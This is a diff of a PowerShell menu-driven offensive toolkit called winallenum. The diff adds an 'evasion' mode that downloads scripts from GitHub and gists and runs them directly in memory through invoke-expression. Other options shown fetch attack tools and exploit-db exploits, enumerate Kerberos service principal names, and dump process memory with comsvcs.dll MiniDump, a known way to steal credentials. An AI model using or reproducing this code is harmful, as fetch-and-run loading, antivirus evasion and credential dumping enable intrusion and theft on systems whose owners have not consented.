@@ -21,25 +21,42 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 
 function ScaricaGist($TESTO, $FILENAME, $URL)
 {
-    write-host "Downloading $TESTO";
-    try{
-    invoke-webrequest -uri "https://gist.githubusercontent.com/$URL" -outfile $FILENAME".tmp";
-    get-content -path $FILENAME".tmp" | set-content -encoding default -path $FILENAME;
-    remove-item -path $FILENAME".tmp"
-    }catch{
-    write-host $_
+    if($EVA -ne "0"){
+        write-host "Downloading $TESTO";
+        try{
+            invoke-webrequest -uri "https://gist.githubusercontent.com/$URL" -outfile $FILENAME".tmp";
+            get-content -path $FILENAME".tmp" | set-content -encoding default -path $FILENAME;
+            remove-item -path $FILENAME".tmp"
+        }catch{
+            write-host $_
+        }
+    }else{
+        try{
+            (invoke-webrequest -uri "https://gist.githubusercontent.com/$URL").content|invoke-expression
+        }catch{
+            write-host $_
+        }
     }
 }
 
 function Scarica($TESTO, $FILENAME, $URL)
 {
-    write-host "Downloading $TESTO";
-    try{
-    invoke-webrequest -uri "https://raw.githubusercontent.com/$URL" -outfile $FILENAME".tmp";
-    get-content -path $FILENAME".tmp" | set-content -encoding default -path $FILENAME;
-    remove-item -path $FILENAME".tmp"
-    }catch{
-    write-host $_
+if($EVA -ne "0"){
+        write-host "Downloading $TESTO";
+        try{
+            invoke-webrequest -uri "https://raw.githubusercontent.com/$URL" -outfile $FILENAME".tmp";
+            get-content -path $FILENAME".tmp" | set-content -encoding default -path $FILENAME;
+            remove-item -path $FILENAME".tmp"
+        }catch{
+            write-host $_
+        }
+    }else{
+        write-host "Downloading $TESTO";
+        try{
+            (invoke-webrequest -uri "https://raw.githubusercontent.com/$URL").content|invoke-expression
+        }catch{
+            write-host $_
+        }
     }
 }
 
@@ -47,9 +64,9 @@ function ScaricaBat($TESTO, $FILENAME, $URL)
 {
     write-host "Downloading $TESTO";
     try{
-    invoke-webrequest -uri "https://raw.githubusercontent.com/$URL" -outfile $FILENAME;
+        invoke-webrequest -uri "https://raw.githubusercontent.com/$URL" -outfile $FILENAME;
     }catch{
-    write-host $_
+        write-host $_
     }
 }
 
@@ -57,9 +74,9 @@ function ScaricaSSL($TESTO, $FILENAME, $URL)
 {
     write-host "Downloading $TESTO";
     try{
-    invoke-webrequest -uri "https://github.com/$URL" -outfile $FILENAME;
+        invoke-webrequest -uri "https://github.com/$URL" -outfile $FILENAME;
     }catch{
-    write-host $_
+        write-host $_
     }
 }
 
@@ -67,9 +84,9 @@ function ScaricaExt($TESTO, $FILENAME, $URL)
 {
     write-host "Downloading $TESTO";
     try{
-    invoke-webrequest -uri "$URL" -outfile $FILENAME;
+        invoke-webrequest -uri "$URL" -outfile $FILENAME;
     }catch{
-    write-host $_
+        write-host $_
     }
 }
 
@@ -77,15 +94,22 @@ function ScaricaEDB($EXPL)
 {
     write-host "Downloading exploit-db/$EXPL";
     try{
-    invoke-webrequest -uri "https://www.exploit-db.com/download/$EXPL" -outfile $EXPL;
+        invoke-webrequest -uri "https://www.exploit-db.com/download/$EXPL" -outfile $EXPL;
     }catch{
-    write-host $_
+        write-host $_
     }
 }
 
+$EVA=0
+
 while($true){
+    if($EVA -ne "0"){
+        $EVT="Evasion/Bypassing=Disabled"
+    }else{
+        $EVT="Evasion/Bypassing=Enabled"
+    }
     write-host "winallenum, by FabioDefilippoSoftware";
-    write-host " 0. exit";
+    write-host " 0. exit`t"$EVT;
     write-host "365";
     write-host " 268. dafthack/MFASweep";
     write-host "ACTIVE DIRECTORY";
@@ -320,7 +344,7 @@ while($true){
     write-host " 335. list all softwares installed`t`t`t`t336. use accesschk`t`t`t`t`t`t337. unquoted service path";
     write-host " 338. scheduled tasks`t`t`t`t`t`t339. autorun startup`t`t`t`t`t`t340. check AlwaysInstallElevated enabled";
     write-host " 341. snmp config`t`t`t`t`t`t342. password in registry`t`t`t`t`t343. sysprep or unattend files";
-    write-host " 454. Active Directory infos`t`t`t`t`t459. Dump memory of a process";
+    write-host " 454. Active Directory infos`t`t`t`t`t459. Dump memory of a process`t`t`t`t`t460. Enable/Disable Evasion/Bypassing";
     write-host "WEBAPP";
     write-host " 350. Mr-Un1k0d3r/RedTeamCSharpScripts/webhunter";
     write-host "WEBDAV";
@@ -751,12 +775,13 @@ while($true){
         '451' {Scarica "SMATechnologies/winscp-powershell" "Winscp.ps1" "SMATechnologies/winscp-powershell/master/Winscp.ps1"}
         '452' {ScaricaSSL "tonylanglet/crushftp.powershell" "crushftp.zip" "tonylanglet/crushftp.powershell/archive/master.zip"}
         '453' {ScaricaSSL "Mr-Un1k0d3r/SCShell" "SCShell.exe" "Mr-Un1k0d3r/SCShell/raw/master/SCShell.exe"}
-        '454' {$search = New-Object DirectoryServices.DirectorySearcher([ADSI]""); $search.filter = "(servicePrincipalName=*)"; $results = $search.Findall(); foreach($result in $results){$userEntry = $result.GetDirectoryEntry(); Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"; Write-host "DN      =      "  $userEntry.distinguishedName; Write-host "Object Cat. = "  $userEntry.objectCategory; Write-host "servicePrincipalNames"; $i=1; foreach($SPN in $userEntry.servicePrincipalName){Write-host "SPN(" $i ")   =      " $SPN       $i+=1}Write-host ""}}
+        '454' {$search=New-Object DirectoryServices.DirectorySearcher([ADSI]""); $search.filter="(servicePrincipalName=*)"; $results=$search.Findall(); foreach($result in $results){$userEntry=$result.GetDirectoryEntry(); Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"; Write-host "DN      =      "  $userEntry.distinguishedName; Write-host "Object Cat. = "  $userEntry.objectCategory; Write-host "servicePrincipalNames"; $i=1; foreach($SPN in $userEntry.servicePrincipalName){Write-host "SPN(" $i ")   =      " $SPN       $i+=1}Write-host ""}}
         '455' {ScaricaSSL "PowerShellEmpire/PowerTools" "PowerTools.zip" "PowerShellEmpire/PowerTools/archive/master.zip"}
         '456' {Scarica "rem1ndsec/DLLJack" "dlljack.ps1" "rem1ndsec/DLLJack/master/dlljack.ps1"}
         '457' {ScaricaSSL "wietze/windows-dll-hijacking" "windows-dll-hijacking.zip" "wietze/windows-dll-hijacking/archive/master.zip"}
         '458' {ScaricaSSL "Flangvik/DLLSideloader" "DLLSideloader.zip" "Flangvik/DLLSideloader/archive/master.zip"}
         '459' {tasklist; write-host "Digit PID, Process ID"; $TPID=read-host "(example, 6095)"; if($TPID -ne ""){rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump $TPID .\$TPID.bin full}}
+        '460' {write-host "Enable or Disable Evasion/Bypassing?"; $EVA=read-host "(example, 1=Enable, 0=Disable)"; if($EVA -ne "1"){$EVA="0"}}
         default{write-host 'ERROR: this choice is incorrect'}
     }
     read-host "Press ENTER to continue";
